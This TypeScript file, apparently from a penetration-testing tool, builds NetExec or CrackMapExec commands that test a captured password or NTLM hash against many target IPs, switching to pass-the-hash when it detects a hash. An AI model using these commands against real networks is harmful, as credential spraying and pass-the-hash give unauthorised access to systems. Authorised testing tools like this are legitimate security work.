import { isNtHash } from './shellEncoders';

export interface BatchCommandOptions {
  protocol?: 'smb' | 'winrm' | 'ssh' | 'mssql' | 'ldap' | 'rdp';
  tool?: 'nxc' | 'cme';
  domain?: string;
  continueOnSuccess?: boolean;
}

/**
 * Builds a weaponized, batch CLI verification command (NetExec / CrackMapExec)
 * to test a credential across multiple target IPs simultaneously.
 * Automatically switches between -p (plaintext) and -H (NTLM Pass-The-Hash) based on hash detection.
 */
export function buildBatchLootVerificationCommand(
  username: string,
  secret: string,
  ips: string[],
  options: BatchCommandOptions = {}
): string {
  const cleanIps = ips
    .map((ip) => ip.trim())
    .filter((ip) => ip && ip !== '0.0.0.0' && !ip.includes('x') && !ip.includes('X'));

  const targetsStr = cleanIps.length > 0 ? cleanIps.join(' ') : '<TARGET_IPS>';
  const tool = options.tool || 'nxc';
  const protocol = options.protocol || 'smb';
  const user = username.trim() || 'administrator';
  const cred = secret.trim();

  // Authentication flag: NTLM hash vs Password
  const isHash = cred && isNtHash(cred);
  const authFlag = isHash ? `-H '${cred}'` : `-p '${cred.replace(/'/g, "'\\''")}'`;

  // Domain flag
  const domain = options.domain?.trim();
  const domainFlag = domain ? `-d '${domain}'` : '';

  // Optional continue on success
  const continueFlag = options.continueOnSuccess !== false ? '--continue-on-success' : '';

  const parts = [
    tool,
    protocol,
    targetsStr,
    `-u '${user}'`,
    authFlag,
    domainFlag,
    continueFlag,
  ].filter(Boolean);

  return parts.join(' ');
}
